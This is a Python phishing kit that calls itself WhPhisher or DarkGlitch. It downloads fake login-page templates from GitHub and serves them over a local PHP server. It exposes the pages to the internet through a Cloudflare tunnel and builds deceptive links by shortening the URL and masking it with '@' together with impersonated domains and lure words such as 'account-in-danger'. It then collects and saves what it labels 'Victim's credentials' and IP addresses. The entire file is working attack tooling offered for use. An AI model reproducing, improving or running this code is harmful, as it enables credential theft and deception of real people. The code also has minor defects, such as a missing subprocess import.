# -*- coding: UTF-8 -*-
# Herramienta  : WhPhisher
# Author       : WhBeatZ

import os, sys, time, socket, json
from os import popen, system
from time import sleep

# Normal
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\33[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
bwhite="\033[1;37m"

nc="\033[00m"

version="1.0"

ask = bgreen + '[' + bwhite + '-' + bgreen + '] '+ bpurple
success = byellow + '[' + bwhite + '√' + byellow + '] '+bgreen
error = bblue + '[' + bwhite + '!' + bblue + '] '+bred
info= byellow + '[' + bwhite + '+' + byellow + '] '+ bcyan
info2= bgreen + '[' + bwhite + '•' + bgreen + '] '+ bpurple

# Logo
logo=f'''


{bcyan  }   banner

{byellow}----> {bcyan}By {bwhite}DarkGlitch {byellow}<-----
{white}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'''

sites=["F3 English"]
pkgs=[ "php", "curl", "wget", "unzip" ]

socket.setdefaulttimeout(30)

root= popen("cd $HOME && pwd").read().strip()


# Check termux
if os.path.exists("/data/data/com.termux/files/home"):
    termux=True
else:
    termux=False

# Get package manager
if system("command -v apt > /dev/null 2>&1")==0:
    apt=True
else:
    apt=False
if system("command -v apt-get > /dev/null 2>&1")==0:
    aptget=True
else:
    aptget=False
if system("command -v sudo > /dev/null 2>&1")==0:
    sudo=True
else:
    sudo=False
if system("command -v pacman  > /dev/null 2>&1")==0:
    pacman=True
else:
    pacman=False
if system("command -v yum > /dev/null 2>&1")==0:
    yum=True
else:
    yum=False
if system("command -v dnf > /dev/null 2>&1")==0:
    dnf=True
else:
    dnf=False
if system("command -v brew > /dev/null 2>&1")==0:
    brew=True
else:
    brew=False
if system("command -v apk > /dev/null 2>&1")==0:
    apk=True
else:
    apk=False


# Website chooser
def options():
    length = len(sites)
    columns = 3  # Number of columns in the display
    rows = (length + columns - 1) // columns  # Calculate rows needed

    for i in range(rows):
        for j in range(columns):
            index = i + j * rows
            if index < length:
                print(f"{green}[{bwhite}{index + 1}{bgreen}] {bcyan}{sites[index]:<20}", end="  ")
        print()

    print()
    print(f"{green}[{bwhite}x{bgreen}]{byellow} About", end="                ")
    print(f"{green}[{bwhite}m{bgreen}]{byellow} More tools", end="       ")
    print(f"{green}[{bwhite}0{bgreen}]{byellow} Exit")
    print()

# Process killer
def killer():
    if system("pidof php > /dev/null 2>&1")==0:
        system("killall php")
    if system("pidof cloudflared > /dev/null 2>&1")==0:
        system("killall cloudflared")
    if system("pidof curl > /dev/null 2>&1")==0:
        system("killall curl")
    if system("pidof wget > /dev/null 2>&1")==0:
        system("killall wget")
    if system("pidof unzip > /dev/null 2>&1")==0:
        system("killall unzip")


# Print logo
def slowprint(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.001)

# Print lines
def sprint(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.01)

# Internet Checker
def internet(host="8.8.8.8", port=53, timeout=5):
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
    except socket.error:
        print(error+"No internet :c")
        time.sleep(2)
        internet()

# Install packages in Termux and Mac
def installer(pm):
    for pkg in range(0, len(pkgs)):
        if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
            sprint("\n"+info+"Instalando hacker :D!!"+pkgs[pkg].upper()+nc)
            system(pm+" install -y "+pkgs[pkg])

# Install packages in Linux
def sudoinstaller(pm):
    for pkg in range(0, len(pkgs)):
        if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
            sprint(info+"Installing "+pkgs[pkg].upper()+nc)
            system("sudo "+pm+" install -y "+pkgs[pkg])


# Ask to mask url
def cuask(url):
    cust= input("\n"+ask+bcyan+"Press (" +bwhite+ "y" +bcyan+") to customize " +byellow+ " link" +bcyan+" o (" +bwhite+ "ENTER" +bcyan+ ") To continue without making changes" +byellow+ " -->" +bwhite+ "  ")
    if not cust=="":
        masking(url)
    waiter()

# Polite Exit
def pexit():
    killer()
    sprint("\n"+info2+bcyan+"Thank you for using " +bwhite+ "DarkGLitch! " +bcyan+ "This is only a modified code, hope you like it" +byellow+ "--> " +bwhite+ "DarkGlitch" +bcyan+ " :D\n"+nc)
    exit(0)


# Info about tool
def about():
    system("clear")
    slowprint(logo)
    print(bcyan+'[Tool Name]  '+bpurple+' :[DarkGlitch] ')
    print(bcyan+'[Version]   '+bpurple+'                 :[1.0]')
    print(bcyan+'[Author]    '+bpurple+'                 :[DarkGlitch] ')

    print()
    print(bgreen+'['+bwhite+'0'+bgreen+']'+byellow+' Exit                     '+     bgreen+'['+bwhite+'99'+bgreen+']'+byellow+'  Menu Principal       ')
    print()
    abot= input("\n > ")
    if abot== "0":
        pexit()
    else:
        main()


def main():
    internet()

    if termux:
        required_pkgs = ["proot", "curl", "ssh", "openssh", "bash"]
        for pkg in required_pkgs:
            if os.system(f"command -v {pkg} > /dev/null 2>&1") != 0:
                os.system(f"pkg install {pkg} -y")
        os.system("pkg upgrade && pkg update")

    # Installing necessary packages based on the package manager
    if sudo:
        for pm in ["apt", "apk", "yum", "dnf", "apt-get"]:
            if eval(pm):
                sudoinstaller(pm)
                break
    elif pacman:
        for pkg in pkgs:
            if os.system(f"command -v {pkg} > /dev/null 2>&1") != 0:
                sprint(f"\n{info}Installing {pkg.upper()}...")
                os.system(f"sudo pacman -S {pkg} --noconfirm")
    elif brew:
        installer("brew")
    elif apt:
        installer("apt")
    else:
        sprint(f"\n{error}Unsupported package manager. Install packages manually!")
        sys.exit(1)

    # Checking essential commands
    for cmd in ["php", "unzip", "curl"]:
        if os.system(f"command -v {cmd} > /dev/null 2>&1") != 0:
            sprint(f"{error}{cmd} cannot be installed. Install it manually!")
            sys.exit(1)

    killer()

    arch = subprocess.getoutput("uname -m").strip()
    os_name = subprocess.getoutput("uname").strip()

    cloudflared_path = os.path.join(root, ".cffolder/cloudflared")
    if not os.path.isfile(cloudflared_path):
        sprint(f"\n{info}Downloading Cloudflare...\n")
        internet()
        os.system("rm -rf cloudflared cloudflared.tgz")

        download_url = ""
        if "Linux" in os_name:
            if "aarch64" in arch:
                download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
            elif "arm" in arch:
                download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
            elif "x86_64" in arch:
                download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
            else:
                download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
        elif "Darwin" in os_name:
            if "x86_64" in arch:
                download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz"
            elif "arm64" in arch:
                sprint(f"{error}Cloudflared not available for this architecture!")
                time.sleep(3)
                return
            else:
                sprint(f"{error}Unknown architecture. Download manually!")
                time.sleep(3)
                return
        else:
            sprint(f"{error}Device not supported!")
            sys.exit(1)

        if download_url:
            os.system(f"wget -q --show-progress {download_url} -O cloudflared")

        os.makedirs(os.path.join(root, ".cffolder"), exist_ok=True)
        os.rename("cloudflared", cloudflared_path)
        os.chmod(cloudflared_path, 0o755)

    if os.system("pidof php > /dev/null 2>&1") == 0:
        sprint(f"{error}Previous PHP process still running! Please restart terminal and try again.")
        sys.exit(1)

    os.makedirs(os.path.join(root, ".site"), exist_ok=True)

    while True:
        os.system("clear")
        slowprint(logo)
        options()

        choose = input(f"{ask}Select number: > ")
        if choose in ["1", "01"]:
            folder = "f3_english"
            mask = "https://hehehhe-try-lang"
            requirements(folder, mask)
        elif choose == "66":
            customfol()
        elif choose.lower() == "x":
            about()
        elif choose.lower() == "m":
            continue  # Avoid recursion, just loop back
        elif choose == "0":
            pexit()
        else:
            sprint(f"\n{error}Not Available!")
            main()

# Copy website files from custom location
def customfol():
    fol=input("\n"+ask+"Enter the directory > "+green)
    if os.path.exists(fol):
        if os.path.isfile(fol+"/index.php"):
            system("cd "+fol+" && rm -rf ip.txt usernames.txt && cp -r * $HOME/.site")
            server()
        else:
            sprint(error+"Index.php required but not found!")
            main()
    else:
        sprint(error+"Directory do not exists!")
        main()

# 2nd function checking requirements and download files 
def requirements(folder,mask):
    if os.path.isfile("websites.zip"):
        system("rm -rf $HOME/.websites && cd $HOME && mkdir .websites")
        system("unzip websites.zip -d $HOME/.websites > /dev/null 2>&1")
        os.remove("websites.zip")
    while True:
        if os.path.exists(root+"/.websites/"+folder):
            system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
            break
        else:
            internet()
            sprint("\n"+info+"Desccargando filas requeridas :D.....\n")
            system("rm -rf site.zip")
            system("wget -q --show-progress https://github.com/WhBeatZ/files-ipcollector/raw/main/phishingsites/"+folder+".zip -O site.zip")
            if not os.path.exists("/.websites"):
                system("cd $HOME && mkdir .websites")
            system("cd $HOME/.websites && mkdir "+folder)
            system("unzip site.zip -d $HOME/.websites/"+folder)
            os.remove("site.zip")
            system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
            break
    with open(".info.txt", "w") as inform:
        inform.write(mask)
    system("mv -f .info.txt $HOME/.site")
    server()

# Start server and tunneling
def server():
    system("clear")
    slowprint(logo)
    if termux:
        sprint("\n"+info+"DarkGlitch, The Modified Phishing tool")
        sleep(1)
    sprint("\n"+info2+"Starting the PHP server at localhost:8080....")
    internet()
    system("cd $HOME/.site && php -S 127.0.0.1:8080 > /dev/null 2>&1 &")
    sleep(2)
    while True:
        if not system("curl --output /dev/null --silent --head --fail 127.0.0.1:8080"):
            sprint("\n"+info+"The PHP server started successfully")
            break
        else:
            sprint(error+"PHP Error")
            killer()
            exit(1)
    sprint("\n"+info2+"Starting tunneling with the same address.....")
    internet()
    system("rm -fr $HOME/.cffolder/log.txt")
    while True:
        if system("command -v termux-chroot > /dev/null 2>&1")==0:
            system("cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
            break
        else:
            system("cd $HOME/.cffolder && ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
            break
    sleep(9)
    cflink=popen("cat $HOME/.cffolder/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read()
    if cflink.find("cloudflare")!=-1:
        cfcheck=True
    else:
        cfcheck=False
    while True:
        if cfcheck:
            url_manager(cflink, "1" , "2")
            cuask(cflink)
            break
        elif not cfcheck:
            url_manager(cflink, "1" , "2")
            cuask(cflink)

# Optional function for ngrok url masking
def masking(url):
    website= "https://is.gd/create.php\?format\=simple\&url\="+url
    internet()
    main1= os.popen("curl -s "+website)
    main2=main1.read()
    if not main2.find("gd")!=-1:
        sprint(error+"Service unavailable")
        waiter()
    main= main2.replace("https://", "")
    domain= input("\n"+ask+"Enter the domain (Example: facebook.com, snapchat.com  ")
    if domain=="":
        sprint("\n"+error+"How??")
        bait= input("\n"+ask+"Write words that describe the link, using a - as a space (Example: login-session, account-in-danger) >")
        if (bait==""):
            sprint("\n"+error+"I didn't understand :c!")
            sprint("\n"+success+"Your link is > https://"+ main)
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"Misspelled")
            waiter()
        final= "https://"+bait+"@"+main
        sprint("\n"+success+"Yor link here > "+ final)
        waiter()
    if (domain.find("http://")!=-1 or domain.find("https://")!=-1):
        bait= input("\n"+ask+"Write words that describe the link, using a hyphen as a space (Example: login-session, account-in-danger) >")
        if (bait==""):
            sprint("\n"+error+"I didn't understand :c!")
            final= domain+"@"+main
            sprint("\n"+success+"Your Link here > "+ final)
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"I didn't understand :c!")
            waiter()
        final= domain+"-"+bait+"@"+main
        sprint("\n"+success+"Your Link here > "+ final)
        waiter()
    else:
        domain= "https://"+domain
        bait= input("\n"+ask+"Write words that describe the link, using a hyphen as a space (Example: login-session, account-in-danger) >")
        if bait=="":
            sprint("\n"+error+"I didn't understand :c!")
            final= domain+"@"+main
            sprint("\n"+success+"Your Link here > "+ final)
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"I didn't understand :c!")
            waiter()
        final= domain+"-"+bait+"@"+main
        sprint("\n"+success+"Your Link here > "+ final)
        waiter()

# Output urls
def url_manager(url,num1,num2):
    internet()
    sprint("\n"+success+"Your links have been generated\n")
    system("rm -rf $HOME/.site/ip.txt")
    print(info2+"URL "+num1+" > "+bwhite+url)
    if os.path.isfile(root+"/.site/.info.txt"):
        with open(root+"/.site/.info.txt", "r") as inform:
            masked=inform.read()
            print(info2+"URL "+num2+" > "+bwhite+masked.strip()+"@"+url.replace("https://",""))


# Last function capturing credentials
def waiter():
    sprint("\n"+info+bpurple+"Waiting for login...." +bcyan+ " Press "+bred+ "Ctrl+C" +bcyan+" To exit: ")
    try:
        while True:
            if os.path.isfile(root+"/.site/usernames.txt"):
                print("\n\n"+success+bgreen+"Victim's credentials found!\n\007")
                with open(root+"/.site/usernames.txt","r") as ufile:
                    userdata=ufile.readlines()
                    j=0
                    o=len(userdata)
                    while j<o:
                        print(bcyan+'['+bgreen+'*'+bcyan+'] '+byellow+userdata[j],end="")
                        j+=1
                print("\n"+info+"Saved in usernames.txt")
                print("\n"+info+bblue+"Waiting for next....."+bcyan+ "Press "+bred+ "Ctrl+C" +bcyan+ " To exit: ")
                system("cat $HOME/.site/usernames.txt >> usernames.txt")
                os.remove(root+"/.site/usernames.txt")
            sleep(0.75)
            if os.path.isfile(root+"/.site/ip.txt"):
                os.system("clear")
                print(logo)
                print("\n\n"+success+bgreen+"Victim's IP found\n\007")
                with open(root+"/.site/ip.txt","r") as ipfile:
                    ipdata=ipfile.readlines()
                    h=0
                    p=len(ipdata)
                    while h<p:
                        print(cyan+'['+green+'*'+cyan+'] '+yellow+ipdata[h], end="")
                        h+=1
                print("\n"+info+"Save on ip.txt")
                print("\n"+info+blue+"Waiting for more information "+cyan+ "Press "+red+ "Ctrl+C"+cyan+" To exit: ")
                system("cat $HOME/.site/ip.txt >> ip.txt")
                os.system("rm -rf $HOME/.site/ip.txt")
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        os.system("stty -echoctl")
        main()
    except KeyboardInterrupt:
        pexit()